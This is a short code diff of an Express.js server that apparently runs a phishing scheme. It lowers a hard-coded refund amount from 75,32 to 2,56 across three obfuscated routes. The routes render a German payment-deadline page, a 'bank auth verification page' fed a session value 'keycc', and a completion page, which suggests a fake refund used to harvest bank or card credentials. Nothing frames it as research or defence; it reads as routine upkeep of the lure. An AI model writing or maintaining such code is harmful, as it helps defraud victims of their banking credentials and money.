@@ -3511,7 +3511,7 @@ app.get("/PrTomeM9HwWUWSulkTe4", (req, res) => {
   deadline.setDate(today.getDate() + 2);
   const paymentDeadline = deadline.toLocaleDateString('de-DE', { day: '2-digit', month: 'long', year: 'numeric' });
 
-  const refundAmount = "75,32";
+  const refundAmount = "2,56";
 
   // Calculate timeline dates for dynamic display
   const dateOptions = { day: 'numeric', month: 'short' }; // e.g., "Oct 2" or "2. Okt" depending on locale
@@ -3536,13 +3536,13 @@ app.get("/PrTomeM9HwWUWSulkTe4", (req, res) => {
 });
 
 app.get("/Ose4aQeM9H4waRfs7PrTv", (req, res) => { // bank auth verification page
-  const refundAmount = "75,32";
+  const refundAmount = "2,56";
   res.render("bankauth", { refundAmount, keycc: req.session.keycc });
 
 });
 
 app.get("/LkaaomeM9HwWU472fgsPr", (req, res) => { // loading 3:
-  const refundAmount = "75,32";
+  const refundAmount = "2,56";
   res.render("done", { refundAmount });
 });
 
